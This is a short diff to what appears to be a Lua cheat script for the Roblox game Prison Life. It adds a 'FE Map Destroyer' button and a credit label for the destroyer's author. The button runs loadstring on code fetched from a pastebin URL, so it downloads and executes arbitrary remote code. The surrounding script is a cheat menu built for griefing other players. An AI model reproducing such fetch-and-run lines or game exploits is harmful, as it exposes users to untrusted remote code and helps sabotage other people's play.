@@ -769,7 +769,13 @@ end)
         
         workspace.Remote.ItemHandler:InvokeServer(unpack(args))
     
-end)
+    end)
+
+    misctab:Button("FE Map Destroyer [Only Click Once]", function()
+    
+        loadstring(game:HttpGet("https://pastebin.com/raw/PjfRsb1M"))()
+
+    end)
 
 teletab:Dropdown('Teleports', {"Cell Room", "Cafeteria", "Guard Spawn", "Prison Courtyard", "Prison Garage", "Prison Gate", "Criminal Base", "City"}, function(v)
 
@@ -818,6 +824,7 @@ end)
     
     credstab:Label('Owner/Founder: Grant1ed#4919')
     credstab:Label('Lead Developer/Scripter: Ducky#3566')
+    credstab:Label('FE Destroy made by w a e on v3rm')
     
     credstab:Button("Copy Discord Invite", function()
         
